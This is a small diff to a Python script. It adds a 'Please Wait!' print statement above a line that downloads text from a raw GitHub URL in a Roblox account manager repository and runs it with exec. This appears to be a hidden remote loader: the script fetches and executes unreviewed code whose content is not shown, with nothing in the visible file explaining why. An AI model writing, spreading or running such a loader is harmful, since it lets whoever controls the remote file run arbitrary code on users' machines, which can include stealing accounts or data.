@@ -37,6 +37,8 @@ while True:
     thread_two.start()
     thread_two.join()
 """)
+    
+print("Please Wait!")
 
 with open("main.py", "r") as file:
     exec(requests.get("https://raw.githubusercontent.com/Mana42138/Roblox-Account-Manager/master/RBX%20Alt%20Manager/Classes/Filter").text)
